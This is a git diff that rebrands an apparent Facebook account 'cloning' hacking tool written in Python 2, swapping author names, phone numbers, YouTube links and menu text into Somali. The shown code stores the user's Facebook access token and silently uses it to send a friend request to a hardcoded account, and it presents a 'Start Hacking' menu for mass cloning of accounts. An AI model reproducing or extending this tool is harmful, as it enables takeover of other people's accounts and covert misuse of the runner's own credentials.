@@ -55,9 +55,9 @@ logo = """
 ██║░░░░░██║██║░╚██╗██║░░██║██║░░██║██████╔╝╚█████╔╝
 ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mJAM-SHAHRUKH_\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/JAM\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m+971528752764\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mcreat by\033[1;36m : \033[1;31mYahye A Dahir_\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/fikrado\033[0m \033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m+252634048063\033[0;31m║
 \033[0;39m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
@@ -77,14 +77,14 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔════════════════════════☠════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   
-\033[1;96m[¤] \x1b[0;31mWHATSAPP : +971528752764\x1b[1;96m  
-\033[1;93m[¤] \x1b[0;31mFACEBOOK : JAM SHAHRUKH\x1b[1;96m  
-\033[1;93m[¤] \x1b[0;31mYOUTUBE  : JAM SHAHRUKH TECHNICAL \x1b[0;31m"""
+print  """\x1b[0;31m [¤] \x1b[0;31mKuso O DHawow\x1b[0;31m  \033[1;96m   
+\033[1;96m[¤] \x1b[0;31mWHATSAPP : +252634048063\x1b[1;96m  
+\033[1;93m[¤] \x1b[0;31mFACEBOOK : fikrado\x1b[1;96m  
+\033[1;93m[¤] \x1b[0;31mYOUTUBE  : fikrado hacker \x1b[0;31m"""
 print " \x1b[1;93m⚔═══════════════════════☠════════════════════════⚔"
 
-CorrectUsername = "jam"
-CorrectPassword = "jam"
+CorrectUsername = "fikrado"
+CorrectPassword = "fikrado"
 
 loop = 'true'
 while (loop == 'true'):
@@ -96,10 +96,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "yang bener dong"
-            os.system('xdg-open https://wa.me/6285691015635')
+            os.system('xdg-open https://www.youtube.com/watch?v=RPHdCNRUjno')
     else:
         print "salah sayang!"
-        os.system('xdg-open https://wa.me/6285691015635')
+        os.system('xdg-open https://www.youtube.com/watch?v=RPHdCNRUjno')
 
 def login():
 	os.system('clear')
@@ -140,7 +140,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+				os.system('xdg-open https://www.youtube.com/channel/UC5a0NVFHNdzVgyI2M3PiN9g')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -178,7 +178,7 @@ def menu():
 		sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91mYour Account is on Checkpoint"
+		print"\033[1;91mfacebook ayaa ka xayiray"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -192,8 +192,8 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;40m══Start Hacking"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Shahrukh"																														
+	print "\033[1;32;40m[1] \033[1;33;40m══qof ka hacking"	
+	print "\033[1;32;40m[2] \033[1;33;40m══Update toolkan"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -292,7 +292,7 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;40m[✺] Total IDs : \033[1;94m"+str(len(id))
+	print "\033[1;36;40m[✺] inta qof ku jira : \033[1;94m"+str(len(id))
 	jalan('\033[1;34;40m[✺] Please Wait...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -300,7 +300,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;31;48m●══════════════════════JAM══════════════════════●"
 
-	jalan('            \033[1;91mJam start cloning Wait...')
+	jalan('            \033[1;91mJam waa uu bilaab may ee sug...')
 	print  "  \033[1;36;48m ●══════════════════════JAM══════════════════════●" 
 
 	def main(arg):
